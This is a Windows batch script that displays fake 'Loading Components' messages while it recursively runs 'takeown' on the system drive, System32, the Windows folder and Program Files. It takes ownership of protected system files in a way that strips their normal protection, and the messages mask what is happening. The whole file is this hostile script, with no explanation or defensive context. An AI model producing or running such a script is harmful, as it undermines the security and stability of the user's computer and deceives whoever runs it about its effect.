@echo off
color 0a
mode 40,10
echo Loading Components..
timeout 2 >nul
echo Changing permissions..
timeout 1 >nul
C:
takeown /f *
cd..
cd..
takeown /f *
cd C:\Windows\System32
takeown /f *
cd C:\Windows
takeown /f *
cd C:\Program Files
takeown /f * /a
goto admintakeown
:admintakeown
ping localhost -n 2 >nul
echo Loading Components for admin..
timeout 2 >nul
echo Changing permissions..
timeout 1 >nul
C:
takeown /f * /a
cd..
cd..
takeown /f * /a
cd C:\Windows\System32
takeown /f * /a 
cd C:\Windows
takeown /f * /a
cd C:\Program Files
takeown /f * /a
pause
exit
